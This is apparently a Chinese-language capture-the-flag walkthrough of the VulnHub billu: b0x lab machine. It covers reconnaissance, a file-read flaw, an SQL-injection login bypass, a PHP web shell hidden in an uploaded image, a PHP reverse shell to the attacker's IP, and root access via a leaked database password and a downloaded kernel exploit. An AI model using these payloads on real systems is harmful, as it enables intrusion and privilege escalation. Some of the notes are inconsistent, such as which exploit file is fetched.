# bills:box 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/billu-b0x,188/
-   下载地址：https://download.vulnhub.com/billu/Billu_b0x.zip



## 信息收集：

### 主机发现

```shell
└─$ sudo nmap -sn 192.168.2.1/24                                     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:56 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00022s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.00020s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for 192.168.2.143
Host is up (0.00023s latency).
MAC Address: 00:0C:29:2A:DF:BC (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00026s latency).
MAC Address: 00:50:56:F3:2E:7C (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds

```



### 端口扫描

```shell
# TCP扫描
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.143 -oA Nmap-scan/sT
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:59 HKT
Nmap scan report for 192.168.2.143
Host is up (0.00075s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:2A:DF:BC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds

# UDP扫描
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.143 -oA Nmap-scan/sU
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 15:00 HKT
Warning: 192.168.2.143 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.143
Host is up (0.0011s latency).
All 65535 scanned ports on 192.168.2.143 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:2A:DF:BC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.70 seconds
```



### 服务及操作系统扫描

```shell
└─$ sudo nmap -sC -sV -O -p22,80 192.168.2.143 -oA Nmap-scan/sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 15:06 HKT
Nmap scan report for 192.168.2.143
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 facfa252c4faf575a7e2bd60833e7bde (DSA)
|   2048 88310c789880ef33fa2622edd09bbaf8 (RSA)
|_  256 0e5e330350c91eb3e75139a44a1064ca (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: --==[[IndiShell Lab]]==--
MAC Address: 00:0C:29:2A:DF:BC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds

```



### 默认漏洞脚本扫描

```shell
└─$ sudo nmap --script=vuln -p22,80 192.168.2.143 -oA Nmap-scan/Script
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 15:07 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.143
Host is up (0.00049s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /test.php: Test page
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
MAC Address: 00:0C:29:2A:DF:BC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 55.98 seconds
```



## web 发现

-   根据提示，应该是有sql注入，先进行目录扫描

![image-20230603151555363](https://raw.githubusercontent.com/r0o983/images/main/image-20230603151555363.png)

### 使用`gobuster`进行web目录扫描

```shell
└─$ sudo gobuster dir -u http://192.168.2.143 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/03 15:18:23 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 3267]
/images               (Status: 301) [Size: 315] [--> http://192.168.2.143/images/]
/c                    (Status: 200) [Size: 1]
/add                  (Status: 200) [Size: 307]
/show                 (Status: 200) [Size: 1]
/test                 (Status: 200) [Size: 72]
/in                   (Status: 200) [Size: 47521]
/head                 (Status: 200) [Size: 2793]
/uploaded_images      (Status: 301) [Size: 324] [--> http://192.168.2.143/uploaded_images/]
/panel                (Status: 302) [Size: 2469] [--> index.php]
/head2                (Status: 200) [Size: 2468]
/server-status        (Status: 403) [Size: 294]
Progress: 217914 / 220561 (98.80%)
===============================================================
2023/06/03 15:19:01 Finished
===============================================================

# 指定需要扫描的文件类型。
└─$ sudo gobuster dir -u http://192.168.2.143 -x txt,php,tar -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,tar
[+] Timeout:                 10s
===============================================================
2023/06/03 15:19:44 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://192.168.2.143/images/]
/index.php            (Status: 200) [Size: 3267]
/index                (Status: 200) [Size: 3267]
/c                    (Status: 200) [Size: 1]
/c.php                (Status: 200) [Size: 1]
/in.php               (Status: 200) [Size: 47525]
/in                   (Status: 200) [Size: 47521]
/show                 (Status: 200) [Size: 1]
/show.php             (Status: 200) [Size: 1]
/add                  (Status: 200) [Size: 307]
/add.php              (Status: 200) [Size: 307]
/test.php             (Status: 200) [Size: 72]
/test                 (Status: 200) [Size: 72]
/head                 (Status: 200) [Size: 2793]
/head.php             (Status: 200) [Size: 2793]
/uploaded_images      (Status: 301) [Size: 324] [--> http://192.168.2.143/uploaded_images/]
/panel                (Status: 302) [Size: 2469] [--> index.php]
/panel.php            (Status: 302) [Size: 2469] [--> index.php]
/head2.php            (Status: 200) [Size: 2468]
/head2                (Status: 200) [Size: 2468]
/server-status        (Status: 403) [Size: 294]
Progress: 880590 / 882244 (99.81%)
===============================================================
2023/06/03 15:22:20 Finished
===============================================================
```

#### 根据目录发现尝试上传点

-   ![image-20230603152714851](https://raw.githubusercontent.com/r0o983/images/main/image-20230603152714851.png)

-   这里上传文件被重定向回来
-   ![image-20230603153105778](https://raw.githubusercontent.com/r0o983/images/main/image-20230603153105778.png)

#### 根据提示尝试文件读取

-   ![image-20230603153444184](https://raw.githubusercontent.com/r0o983/images/main/image-20230603153444184.png)

-   此处经过尝试发现无法使用get方式获取文件，尝试使用post方式获取文件

-   ```shell
    └─$ curl -d "file=/etc/passwd" http://192.168.2.143/test.php    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    syslog:x:101:103::/home/syslog:/bin/false
    mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
    messagebus:x:103:106::/var/run/dbus:/bin/false
    whoopsie:x:104:107::/nonexistent:/bin/false
    landscape:x:105:110::/var/lib/landscape:/bin/false
    sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
    ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
    
    # 经过尝试，只能读取到passwd文件，无法获取shadow文件。
    ```

-   读取登陆页的php文件查看源码为下一步sql注入做准备

-   ```php
    └─$ curl -d "file=./index.php" http://192.168.2.143/test.php
    <?php
    session_start();
    
    include('c.php');
    include('head.php');
    if(@$_SESSION['logged']!=true)
    {
            $_SESSION['logged']='';
    
    }
    
    if($_SESSION['logged']==true &&  $_SESSION['admin']!='')
    {
    
            echo "you are logged in :)";
            header('Location: panel.php', true, 302);
    }
    else
    {
    echo '<div align=center style="margin:30px 0px 0px 0px;">
    <font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font> 
    <br><br>
    Show me your SQLI skills <br>
    <form method=post>
    Username :- <Input type=text name=un> &nbsp Password:- <input type=password name=ps> <br><br>
    <input type=submit name=login value="let\'s login">';
    }
    if(isset($_POST['login']))
    {
            $uname=str_replace('\'','',urldecode($_POST['un']));
            $pass=str_replace('\'','',urldecode($_POST['ps']));
            $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
            $result = mysqli_query($conn, $run);
    if (mysqli_num_rows($result) > 0) {
    
    $row = mysqli_fetch_assoc($result);
               echo "You are allowed<br>";
               $_SESSION['logged']=true;
               $_SESSION['admin']=$row['username'];
               
             header('Location: panel.php', true, 302);
       
    }
    else
    {
            echo "<script>alert('Try again');</script>";
    }
    
    }
    echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";
    
    ?>
    
    ```

-   构建sql语句

-   ```sql
    select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\';
    select * from auth where pass = \'' 'or 1=1 -- \'\' and uname=\' 'or 1=1 -- \''\';
    
    select * from auth where  pass=\' 'or 1=1 -- \' and uname=\' 'or 1=1 -- \';
    
    
    $pass = 'or 1=1 -- \
    $uname = 'or 1=1 -- \
    ```

    

#### sql注入测试

-   ![image-20230608091339778](https://raw.githubusercontent.com/r0o983/images/main/image-20230608091339778.png)
-   通过之前构造的`sql`语句成功进入系统，发现在当前页面可以添加用户，以及上传用户头像，所以这里使用使用图片马进行上传测试（测试过上传php，发现有验证，只允许上传png,jpg,gif
-   ![image-20230608091539693](https://raw.githubusercontent.com/r0o983/images/main/image-20230608091539693.png)

-   在图像中塞入一句话木马：`<?php system($_GET['cmd']); ?>`

-   图片上传成功，使用burp拦截测试

-   ![image-20230608092152854](https://raw.githubusercontent.com/r0o983/images/main/image-20230608092152854.png)

-   使用`burp`拦截测试，发现可以正常返回数据，使用反弹shell来进行连接-->ps:使用png图片无法进行访问，不知什么原因，无奈改为jpg格式图片进行上传

-   ![image-20230608095623762](https://raw.githubusercontent.com/r0o983/images/main/image-20230608095623762.png)

-   反弹shell代码：`php -r '$sock=fsockopen("192.168.2.128",9001);shell_exec("sh <&3 >&3 2>&3");'`此处需要将代码进行关键字符转义，否则无法获得反弹连接

-   本地发起监听，等待靶机回连--> 获得初始shell

-   ```shell
    ❯ nc -nvlp 9001
    listening on [any] 9001 ...
    connect to [192.168.2.128] from (UNKNOWN) [192.168.2.143] 40499
    whoami
    www-data
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:2a:df:bc brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.143/24 brd 192.168.2.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe2a:dfbc/64 scope link 
           valid_lft forever preferred_lft forever
    uname -a
    Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
    
    ```



## 提权

```shell
# 提升shell交互性
python -c 'import pty;pty.spawn("/bin/bash")';

# 查看当前用户系统权限
www-data@indishell:/var/www$ sudo -l
sudo -l
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
sudo: 3 incorrect password attempts

# 通过递归搜索当前文件夹下所有文件，并且忽略大小写，匹配passw 关键字
www-data@indishell:/var/www$ grep -ri "passw" .

```

-   通过关键字搜索得到以下有效信息--> 数据库配置账号密码

-   ![image-20230608100919229](https://raw.githubusercontent.com/r0o983/images/main/image-20230608100919229.png)

-   查看文件具体配置信息：

-   ```shell
    www-data@indishell:/var/www/phpmy$ cat config.inc.php
    cat config.inc.php
    <?php
    
    /* Servers configuration */
    $i = 0;
    
    /* Server: localhost [1] */
    $i++;
    $cfg['Servers'][$i]['verbose'] = 'localhost';
    $cfg['Servers'][$i]['host'] = 'localhost';
    $cfg['Servers'][$i]['port'] = '';
    $cfg['Servers'][$i]['socket'] = '';
    $cfg['Servers'][$i]['connect_type'] = 'tcp';
    $cfg['Servers'][$i]['extension'] = 'mysqli';
    $cfg['Servers'][$i]['auth_type'] = 'cookie';
    $cfg['Servers'][$i]['user'] = 'root';
    $cfg['Servers'][$i]['password'] = 'roottoor';
    $cfg['Servers'][$i]['AllowNoPassword'] = true;
    
    /* End of servers configuration */
    
    $cfg['DefaultLang'] = 'en-utf-8';
    $cfg['ServerDefault'] = 1;
    $cfg['UploadDir'] = '';
    $cfg['SaveDir'] = '';
    
    
    /* rajk - for blobstreaming */
    $cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
    $cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
    $cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
    $cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';
    
    
    ?>
    www-data@indishell:/var/www/phpmy$ 
    
    ```

-   由于当前配置的用户为`root`用户，尝试使用`ssh`来进行登录`(root:roottoor)`

### 密码提权（一）

-   成功获取root权限

-   ```shell
    ❯ ssh root@192.168.2.143        
    The authenticity of host '192.168.2.143 (192.168.2.143)' can't be established.
    ECDSA key fingerprint is SHA256:UyLCTuDmpoRJdivxmtTOMWDk0apVt5NWjp8Xno1e+Z4.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.2.143' (ECDSA) to the list of known hosts.
    root@192.168.2.143's password: 
    Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)
    
     * Documentation:  https://help.ubuntu.com/
    
      System information as of Thu Jun  8 07:42:47 IST 2023
    
      System load:  0.0               Processes:           113
      Usage of /:   13.2% of 9.61GB   Users logged in:     0
      Memory usage: 11%               IP address for eth0: 192.168.2.143
      Swap usage:   0%
    
      Graph this data and manage this system at:
        https://landscape.canonical.com/
    
    New release '14.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.
    
    
    Your Hardware Enablement Stack (HWE) is supported until April 2017.
    
    Last login: Sat Jun  3 01:43:03 2023
    root@indishell:~# whoami
    root
    root@indishell:~# ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:2a:df:bc brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.143/24 brd 192.168.2.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe2a:dfbc/64 scope link 
           valid_lft forever preferred_lft forever
    root@indishell:~# uname -a
    Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
    root@indishell:~# 
    
    ```

### 内核提权（二）

-   搜索当前版本内核漏洞

-   ```shell
    ❯ searchsploit linux kernel 3.13
    ------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                     |  Path
    ------------------------------------------------------------------- ---------------------------------
    Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Esc | solaris/local/15962.c
    Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation  | linux/local/50135.c
    Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' R | linux/local/40616.c
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condit | linux/local/40847.cpp
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condi | linux/local/40838.c
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Con | linux/local/40839.c
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condit | linux/local/40611.c
    Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Lo | linux/local/41995.c
    Linux Kernel 3.13 - SGID Privilege Escalation                      | linux/local/33824.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'ove | linux/local/37292.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'ove | linux/local/37293.txt
    Linux Kernel 3.13.1 - 'Recvmmsg' Local Privilege Escalation (Metas | linux/local/40503.rb
    Linux Kernel 3.13/3.14 (Ubuntu) - 'splice()' System Call Local Den | linux/dos/36743.c
    Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Co | linux_x86-64/local/33516.c
    Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X | linux_x86-64/local/31347.c
    Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitr | linux/local/31346.c
    Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)              | linux/dos/31305.c
    Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Fr | linux/dos/43234.c
    Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation         | linux/local/41886.c
    Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation  | linux/local/34923.c
    Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege  | linux_x86-64/local/44302.c
    Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial  | linux/dos/42136.c
    Linux kernel < 4.10.15 - Race Condition Privilege Escalation       | linux/local/43345.c
    Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privi | linux/local/45553.c
    Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)            | linux/dos/42762.txt
    Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege | linux/local/45010.c
    Linux Kernel < 4.14.rc3 - Local Denial of Service                  | linux/dos/42932.c
    Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak           | linux/local/44325.c
    Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corrupti | linux/dos/44832.txt
    Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                     | linux/dos/44579.c
    Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escala | linux/local/44298.c
    Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_off | linux_x86-64/local/44300.c
    Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local  | linux/local/43418.c
    Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/ | linux/local/47169.c
    Linux Kernel < 4.5.1 - Off-By-One (PoC)                            | linux/dos/44301.c
    ------------------------------------------------------------------- ---------------------------------
    ```

-   经过测试，推荐使用的漏洞脚本是`37292.c`

-   下载利用文件： `searchsploit linux kernel -m linux/local/34923.c `

-   本地开启php简易服务器：-->`php -S 0:80`

-   下载文件到靶机中

-   ```shell
    2023-06-08 08:00:47--  http://192.168.2.128/37292.c
    sh: 4: 2023-06-08: not found
    # Connecting to 192.168.2.128:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 4968 (4.9K) [text/x-c]
    Saving to: `37292.c'
    
    100%[======================================>] 4,968       --.-K/s   in 0s      
    
    ```

-   成功获取root权限

-   ```shell
    
    www-data@indishell:/tmp$ gcc 37292.c -o 37292 
    gcc 37292.c -o 37292
    www-data@indishell:/tmp$ ./37292
    ./37292
    spawning threads
    mount #1
    mount #2
    child threads done
    /etc/ld.so.preload created
    crsh: 5: Syntax error: Unterminated quoted string
    # > > > > > > > > > > > eating shared library
    # whoami
    whoami
    root
    # ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft fore> > > > > > > > > ver preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
        link/ether 00:0c:29:2a:df:bc brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.143/24 brd 192.168.2.255 scope global eth> > > > > 0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe2a:dfbc/64 scope link 
           valid_lft forever preferred_lft forever
    # uname -a 
    uname -a
    Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54> > > > > >  UTC 2014 i686 i686 i386 GNU/Linux
    
    ```

    
